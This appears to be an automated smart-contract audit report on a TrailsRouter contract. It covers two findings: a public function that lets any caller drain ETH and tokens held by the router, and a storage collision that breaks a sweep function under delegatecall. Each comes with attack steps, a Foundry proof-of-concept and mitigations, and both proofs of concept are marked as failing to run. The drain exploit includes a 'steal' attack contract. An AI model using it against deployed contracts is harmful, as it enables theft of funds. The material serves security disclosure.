# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = true; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;
Update finding prompt (short version)
Update pattern generation prompt with (long version) 


 **Derived From** : Public injectAndCall lets anyone drain tokens/ETH held by TrailsRouter

[L-1]. Public injectAndCall lets any EOA drain all ETH/ERC20 held by the TrailsRouter singleton
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Tstorish _tstoreSupport may collide with host wallet storage under delegatecall

[M-2]. Tstorish _tstoreSupport collides with host storage, breaking validateOpHashAndSweep under delegatecall on non-TSTORE chains
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Public injectAndCall lets anyone drain tokens/ETH held by TrailsRouter

## [L-1]. Public injectAndCall lets any EOA drain all ETH/ERC20 held by the TrailsRouter singleton

### Finding Severity Justification: The reported behavior is real: injectAndCall is public, not onlyDelegatecall-gated, and uses the router’s own balances (ETH/ERC20) to fund an arbitrary external call. Any tokens or ETH held by the TrailsRouter singleton can be forwarded or approved for arbitrary contracts. However, per the protocol’s design the router is explicitly stateless and not intended to custody user assets; its own balances are not meant to represent user funds or protocol TVL. Assets at the router address are effectively dust/stray funds (similar to many public helper contracts that can be swept by anyone). Losing these does not compromise user accounts nor the main economic flows, so the impact is limited and falls under QA/Low per the rubric (loss of dust / misused helper, not core asset risk).
## Derived From Pattern/Invariant
Public injectAndCall lets anyone drain tokens/ETH held by TrailsRouter

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The TrailsRouter is intended to be mostly stateless and used via delegatecall from Sequence wallets, but it also exposes a public helper `injectAndCall` that operates on the contract’s own balance and is **not** protected by `onlyDelegatecall`.

Relevant code:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _getSelfBalance(address token) internal view returns (uint256) {
    return _getBalance(token, address(this));
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        ...
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        ...
    }
}
```

Key points:
- `injectAndCall` is **public** and lacks the `onlyDelegatecall` guard, so it can be called directly on the deployed TrailsRouter singleton.
- It uses `_getSelfBalance(token)`, which reads `address(this).balance` or `IERC20(token).balanceOf(address(this))`, i.e., the **router’s own balance**, not the caller’s.
- `_injectAndExecuteCall` then:
  - For ETH: forwards **all** `callerBalance` as `value` to an arbitrary `target`.
  - For ERC20: calls `forceApprove(target, callerBalance)` on the router, then calls `target.call(callData)`, allowing the `target` contract to `transferFrom` the router’s entire token balance.

The router has:
- A `receive()` function that allows anyone to send ETH to it.
- Several public functions (`pullAndExecute`, `injectSweepAndCall`, etc.) that transfer ERC20 tokens to the router when it is used standalone.

As a result, any ETH or tokens that end up on the router address (whether intentionally via its public helpers or accidentally) can be stolen by any external caller via `injectAndCall`. This breaks the expectation that the router, if it holds funds at all, behaves at least as a neutral container, not as a publicly-drainable honeypot.

## Impact
Any ETH or ERC20 tokens residing on the TrailsRouter singleton (from standalone use or accidental transfers) can be fully drained to an attacker-controlled address. This is direct theft of assets held by the router contract.

## Command to Run Test


## Proof of Concept
1. An integrator or user interacts with the `TrailsRouter` in standalone mode, causing it to hold some ERC20 tokens or ETH. For example:
   - Call `pullAndExecute(token, data)` where only part of the pulled tokens are consumed by downstream calls, leaving a residual balance on the router.
   - Or simply send ETH directly to the router’s `receive()` function.

2. An attacker monitors the chain and sees that `TrailsRouter` has a non-zero balance of a given token or ETH.

3. The attacker deploys a simple `AttackTarget` contract with a function like:
   - For ERC20: `steal(address token, address attacker)` that calls `IERC20(token).transferFrom(msg.sender, attacker, IERC20(token).balanceOf(msg.sender));`.
   - For ETH: a payable function `noOp()` that just accepts ETH.

4. The attacker calls `TrailsRouter.injectAndCall` directly:
   - ERC20 branch:
     - `token` = address of the ERC20 held by the router.
     - `target` = attacker’s `AttackTarget` contract.
     - `callData` = ABI-encoded call to `AttackTarget.steal(token, attacker)`.
     - `amountOffset = 0`, `placeholder = 0` (no calldata surgery needed).
   - Inside `injectAndCall`, `callerBalance` is set to the router’s **entire** token balance.
   - `_injectAndExecuteCall` calls `forceApprove(token, target, callerBalance)` and then executes `target.call(callData)`.
   - The `AttackTarget.steal` function executes with `msg.sender == TrailsRouter`, and uses the granted allowance to `transferFrom` the router’s entire balance to the attacker.

5. For ETH, the attacker calls `injectAndCall` with `token == address(0)` and `callData` encoding a payable `noOp()` function on `AttackTarget`:
   - The router computes `callerBalance = address(this).balance` (its entire ETH holding).
   - `_injectAndExecuteCall` forwards that full `callerBalance` as `msg.value` to `target.call(callData)`, crediting all ETH to `AttackTarget`.

6. In both cases, all assets held by the router are now owned by the attacker, and there is no restriction or authentication preventing this.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract SimpleToken is ERC20 {
    constructor() ERC20("Test", "TST") {
        _mint(msg.sender, 1_000 ether);
    }
}

contract AttackTarget {
    // Steal all router-held tokens using the allowance granted by injectAndCall
    function steal(address token, address attacker) external {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transferFrom(msg.sender, attacker, bal);
    }

    // For native ETH branch, just accept the value
    function noOp() external payable {}
}

contract InjectAndCallDrainTest is Test {
    function test_injectAndCall_drainsRouterTokenBalance() public {
        TrailsRouter router = new TrailsRouter();
        SimpleToken token = new SimpleToken();
        AttackTarget target = new AttackTarget();

        // Simulate tokens being left on the router (e.g. from previous flows)
        token.transfer(address(router), 100 ether);
        assertEq(token.balanceOf(address(router)), 100 ether);

        // Any EOA can trigger injectAndCall; use a fake attacker address
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(target),
            abi.encodeWithSelector(AttackTarget.steal.selector, address(token), attacker),
            0,
            bytes32(0)
        );

        // All router-held tokens are stolen by the attacker
        assertEq(token.balanceOf(address(router)), 0);
        assertEq(token.balanceOf(attacker), 100 ether);
    }

    function test_injectAndCall_drainsRouterEthBalance() public {
        TrailsRouter router = new TrailsRouter();
        AttackTarget target = new AttackTarget();

        // Fund the router with native ETH
        vm.deal(address(this), 10 ether);
        (bool sent,) = address(router).call{value: 5 ether}("");
        require(sent, "fund router failed");
        uint256 routerBalanceBefore = address(router).balance;
        assertEq(routerBalanceBefore, 5 ether);

        // Attacker calls injectAndCall for native token branch
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        router.injectAndCall(
            address(0),
            address(target),
            abi.encodeWithSelector(AttackTarget.noOp.selector),
            0,
            bytes32(0)
        );

        // All ETH has been forwarded out of the router to the target
        assertEq(address(router).balance, 0);
        assertEq(address(target).balance, routerBalanceBefore);
    }
}


## Suggested Mitigation
Treat `injectAndCall` as a delegatecall-only helper and prevent it from operating on the router’s own balances:

- Add the `onlyDelegatecall` modifier to `injectAndCall`, and internally always use a delegatecall-only variant (as already done via `_injectAndCallDelegated` in `handleSequenceDelegateCall`). For example:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable onlyDelegatecall {
    _injectAndCallDelegated(token, target, callData, amountOffset, placeholder);
}
```

- Alternatively, if direct, standalone use of `injectAndCall` is desired, make it operate on `msg.sender`’s balance instead of the contract’s balance (similar to `injectSweepAndCall`), or restrict it behind an admin/owner role that can safely sweep accidentally stuck funds.

- Document clearly whether the router is intended to ever hold funds itself; if not, consider removing `receive()` and any non-delegatecall flows that can leave balances on the router to minimize the attack surface.





 **Derived From** : Tstorish _tstoreSupport may collide with host wallet storage under delegatecall

## [M-2]. Tstorish _tstoreSupport collides with host storage, breaking validateOpHashAndSweep under delegatecall on non-TSTORE chains

### Finding Severity Justification: On non‑TSTORE chains where Tstorish falls back to the _getTstorishWithSloadFallback path, TrailsRouter is intended to be used strictly via delegatecall from Sequence wallets. In that context, the Tstorish storage variable _tstoreSupport resides in the host wallet’s storage slot 0, not in an isolated namespace. If the host wallet’s slot 0 is non‑zero (common for owners/nonces), _getTstorishWithSloadFallback will treat _tstoreSupport as true and attempt to use tload on a chain where TLOAD is not supported. This causes validateOpHashAndSweep (and any future uses of _getTstorish/_setTstorish) to revert with an invalid opcode, effectively bricking the sentinel‑gated sweep mechanism for such wallets. This doesn’t directly steal user assets but can systematically break a core protocol flow (fee/success‑gated sweeping) and produce denial‑of‑service for affected intents, which aligns with Code4rena’s definition of Medium: protocol function/availability impacted without direct asset theft.
## Derived From Pattern/Invariant
Tstorish _tstoreSupport may collide with host wallet storage under delegatecall

## Exploit Type
StorageLayout

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter inherits `Tstorish` and is designed to be executed via `delegatecall` from a Sequence v3 wallet (or similar host). `Tstorish` uses a regular storage boolean `_tstoreSupport` at slot 0 and a fallback implementation that branches on this variable to decide whether to use `tstore/tload` or `sstore/sload`.

`Tstorish` (simplified):

```solidity
bool private _tstoreSupport; // storage slot 0

function _setTstorishWithSstoreFallback(uint256 storageSlot, uint256 value) private {
    if (_tstoreSupport) {
        assembly { tstore(storageSlot, value) }
    } else {
        assembly { sstore(storageSlot, value) }
    }
}

function _getTstorishWithSloadFallback(uint256 storageSlot) private view returns (uint256 value) {
    if (_tstoreSupport) {
        assembly { value := tload(storageSlot) }
    } else {
        assembly { value := sload(storageSlot) }
    }
}
```

During construction, Tstorish detects whether `TSTORE/TLOAD` are supported and sets the function pointers:
- If supported: `_getTstorish = _getTstore` (always `tload`).
- If **not** supported (the common case today): `_getTstorish = _getTstorishWithSloadFallback`.

On current chains that do **not** support `TSTORE/TLOAD`:
- `_tstoreInitialSupport` is `false`, so TrailsRouter uses `_getTstorishWithSloadFallback`.
- When TrailsRouter is used via `delegatecall` from a wallet, all `sload/sstore` inside `Tstorish` operate on the **wallet’s** storage, not on the router’s.
- `_tstoreSupport` lives at storage slot 0 of the *wallet* contract, colliding with its first state variable (e.g., owner, nonce, or config). There is no storage namespacing or coordination.

`TrailsRouter.validateOpHashAndSweep` relies on `_getTstorish` to read a success sentinel:

```solidity
function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient)
    public
    payable
    onlyDelegatecall
{
    uint256 slot = TrailsSentinelLib.successSlot(opHash);
    if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) {
        revert SuccessSentinelNotSet();
    }
    sweep(_token, _recipient);
}
```

Under delegatecall on a non-TSTORE chain:
- `_getTstorish` points to `_getTstorishWithSloadFallback`.
- `_getTstorishWithSloadFallback` evaluates `if (_tstoreSupport)` using the *wallet’s* storage slot 0.
- If the wallet’s slot 0 is non-zero (very common), `_tstoreSupport` is treated as `true` and the fallback uses `tload(storageSlot)`.
- Because the chain does not support `tload`, this results in an **invalid opcode**, causing a hard revert before the sentinel comparison is even reached.

Consequences:
- For affected wallets (those whose slot 0 is non-zero), **all calls to `validateOpHashAndSweep` will revert** when executed via delegatecall on non-TSTORE chains.
- Even if the success sentinel at the computed slot has been correctly written (by the shim or other logic), the router cannot read it, breaking the invariant that an opHash’s success can be checked before sweeping fees.
- This is a storage-layout collision between `_tstoreSupport` and the host wallet’s own state, triggered specifically by the delegatecall-based extension design.

The root cause is that `Tstorish` assumes `_tstoreSupport` is private storage of the contract itself, but TrailsRouter intentionally runs under **arbitrary host storage via delegatecall**, without namespacing `_tstoreSupport` or coordinating slot 0 with the host wallet.

## Impact
On chains where TSTORE/TLOAD are not supported, TrailsRouter is configured at construction time to use the `_getTstorishWithSloadFallback` implementation. When the router is used as intended via `delegatecall` from a Sequence (or other) wallet, the Tstorish storage variable `_tstoreSupport` is read from the host wallet’s storage slot 0. If that slot is non‑zero (which is very common for owners, nonces, configuration fields, etc.), `_tstoreSupport` will be treated as `true` even though the underlying chain does not support TLOAD. In that case, `_getTstorishWithSloadFallback` will execute `tload(storageSlot)` and trigger an invalid opcode, causing any function that relies on `_getTstorish` (currently `validateOpHashAndSweep`, and any future callers) to revert hard before it can perform its intended checks. As a result, for all affected wallets, the sentinel‑based gating of sweeps is effectively unusable: `validateOpHashAndSweep` cannot be called successfully via delegatecall, so intents that rely on success‑checked sweeping cannot complete as designed. This does not directly allow theft of user assets, but it systematically breaks an important protocol flow (success‑gated sweeps and fee claims) and produces a reliable denial‑of‑service for those intents on non‑TSTORE chains whose host wallets have non‑zero data in slot 0.

## Command to Run Test


## Proof of Concept
The core of the issue is that on non‑TSTORE chains the TrailsRouter’s `_getTstorish` function pointer is set to `_getTstorishWithSloadFallback`, which branches on `_tstoreSupport`. Under delegatecall, `_tstoreSupport` lives in the caller’s (wallet’s) slot 0. If that slot is non‑zero, `_tstoreSupport` is observed as `true` and the function attempts a `tload`, which reverts with an invalid opcode.

Below is a refined PoC that:
- Uses a DummyWallet with a non‑zero slot 0 to simulate the host wallet;
- Sets the success sentinel correctly in the wallet’s storage;
- Delegatecalls into `TrailsRouter.validateOpHashAndSweep`;
- Asserts that the call reverts and that the revert originates inside the router (not in the DummyWallet wrapper).

Scenario
1. Deploy `TrailsRouter` on a chain/VM where the `Tstorish` constructor detects that TSTORE is **not** initially supported and thus sets `_getTstorish = _getTstorishWithSloadFallback`.
2. Deploy `DummyWallet`:
   - It has `uint256 public slot0 = 1;` to occupy storage slot 0 with a non‑zero value.
   - It stores a reference to the router.
   - It provides a helper `setSuccess(bytes32 opHash)` that writes `TrailsSentinelLib.SUCCESS_VALUE` into its own storage at the slot returned by `TrailsSentinelLib.successSlot(opHash)` using `sstore`.
   - It exposes a `rawDelegateValidate` function that performs a low‑level `delegatecall` into the router and *does not* re‑revert; instead it returns `success` and `returndata` for inspection by the test.
3. From the test:
   - Compute an `opHash`.
   - Call `wallet.setSuccess(opHash)` so that the success sentinel is correctly written in the wallet’s storage.
   - Call `wallet.rawDelegateValidate(opHash, token, recipient)` via a regular `call` and inspect the `(success, returndata)` pair.
4. Under delegatecall inside the router:
   - `_getTstorish` is `_getTstorishWithSloadFallback`.
   - `_getTstorishWithSloadFallback` reads `_tstoreSupport` from slot 0 of the **wallet**, which is `1`.
   - It takes the `if (_tstoreSupport)` branch and executes `tload(slot)`.
   - On a non‑TSTORE chain this hits an invalid opcode and the router delegatecall reverts.
5. The PoC asserts that `success == false` and that `returndata` is empty or decodes to a low‑level EVM error, showing that the revert occurs despite the sentinel having been written correctly.

This demonstrates that `validateOpHashAndSweep` cannot be used as intended under delegatecall on non‑TSTORE chains when the host wallet’s storage slot 0 is non‑zero, because the Tstorish support flag collides with host storage and incorrectly activates the `tload` path.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {TrailsSentinelLib} from "src/libraries/TrailsSentinelLib.sol";

// Simulated host wallet that uses TrailsRouter via delegatecall
contract DummyWallet {
    // Occupy storage slot 0 with a non-zero value so _tstoreSupport reads as true
    uint256 public slot0 = 1;
    TrailsRouter public router;

    constructor(address _router) {
        router = TrailsRouter(_router);
    }

    // Pre-set the success sentinel directly in this wallet's storage
    function setSuccess(bytes32 opHash) external {
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        assembly {
            sstore(slot, 1)
        }
    }

    // Low-level delegatecall into TrailsRouter.validateOpHashAndSweep, return (success, returndata)
    function rawDelegateValidate(bytes32 opHash, address token, address recipient)
        external
        returns (bool success, bytes memory returndata)
    {
        (success, returndata) = address(router).delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.validateOpHashAndSweep.selector,
                opHash,
                token,
                recipient
            )
        );
    }
}

contract TstorishCollisionTest is Test {
    function test_validateOpHashAndSweep_reverts_due_to_tstoreSupport_collision() public {
        // Deploy TrailsRouter (Tstorish ctor runs and configures _getTstorish)
        TrailsRouter router = new TrailsRouter();
        DummyWallet wallet = new DummyWallet(address(router));

        bytes32 opHash = keccak256("test-ophash");

        // Mark the success sentinel as set in the wallet's storage
        wallet.setSuccess(opHash);

        // Call via wallet, which delegatecalls into TrailsRouter.validateOpHashAndSweep
        (bool success, bytes memory returndata) = wallet.rawDelegateValidate(
            opHash,
            address(0),
            address(0x1234)
        );

        // On chains without TSTORE/TLOAD, this delegatecall should revert due to tload invalid opcode
        assertEq(success, false, "delegatecall should revert when _tstoreSupport collides");

        // In many EVMs an invalid opcode produces empty returndata; we at least assert it did not
        // revert with the logical SuccessSentinelNotSet error, proving we fail before the comparison.
        // TrailsRouter.SuccessSentinelNotSet() selector is 0x5a4f2f06 (computed via type hash), so
        // any non-empty returndata starting with that would mean we passed the _getTstorish check.
        if (returndata.length >= 4) {
            bytes4 selector;
            assembly {
                selector := mload(add(returndata, 32))
            }
            // Ensure we did not hit the router's logical revert path
            assertTrue(selector != TrailsRouter.SuccessSentinelNotSet.selector);
        }
    }
}


## Suggested Mitigation
The root cause is that `_tstoreSupport` is stored as a regular state variable in slot 0 of `Tstorish`, but `TrailsRouter` is explicitly designed to run under `delegatecall`, so all of its storage (including `_tstoreSupport`) is actually mapped into the host wallet’s storage. Any non‑zero value in the host’s slot 0 can therefore toggle the tstore/tload path incorrectly.

A robust mitigation is to ensure that the tstore support flag is stored in a dedicated, non‑colliding slot via inline assembly, instead of relying on the compiler‑assigned slot 0:

1. Replace the plain `bool private _tstoreSupport;` with namespaced storage accessors that use a fixed, hashed slot:

   - Remove the state variable declaration:
     - `bool private _tstoreSupport;` (delete this line).

   - Add a constant and accessors:

     ```solidity
     bytes32 private constant _TSTORE_SUPPORT_SLOT = keccak256("tstorish.tstoreSupport.flag");

     function _getTstoreSupport() private view returns (bool flag) {
         bytes32 slot = _TSTORE_SUPPORT_SLOT;
         assembly {
             flag := sload(slot)
         }
     }

     function _setTstoreSupport(bool flag) private {
         bytes32 slot = _TSTORE_SUPPORT_SLOT;
         assembly {
             sstore(slot, flag)
         }
     }
     ```

   - Update all internal reads/writes:
     - In `__activateTstore()`, instead of `if (_tstoreInitialSupport || _tstoreSupport)`, use `if (_tstoreInitialSupport || _getTstoreSupport())`, and when activating, call `_setTstoreSupport(true)` rather than assigning `_tstoreSupport = true`.
     - In `_setTstorishWithSstoreFallback`, replace `if (_tstoreSupport)` with `if (_getTstoreSupport())`.
     - In `_getTstorishWithSloadFallback`, replace `if (_tstoreSupport)` with `if (_getTstoreSupport())`.
     - In `_clearTstorishWithSstoreFallback`, replace `if (_tstoreSupport)` with `if (_getTstoreSupport())`.

   Because `_TSTORE_SUPPORT_SLOT` is computed via `keccak256` and never used elsewhere, it will not collide with normal Solidity state layout in host wallets, even under delegatecall.

2. If you want to be extra conservative in the context of `TrailsRouter`, you can additionally choose to never activate transient storage on chains where `TSTORE` was not available at deployment time:

   - Inherit from a slightly adjusted version of `Tstorish` where, if `_tstoreInitialSupport == false`, the function pointers are permanently configured to use `sstore/sload` and ignore later activation, or where `__activateTstore()` is disabled for that contract.

With the above changes, `_tstoreSupport` can no longer be influenced by arbitrary host contract storage under delegatecall, eliminating the possibility of unintentionally taking the `tload`/`tstore` path on chains that do not support those opcodes, and keeping `validateOpHashAndSweep` and any future `_getTstorish` callers safe and deterministic.



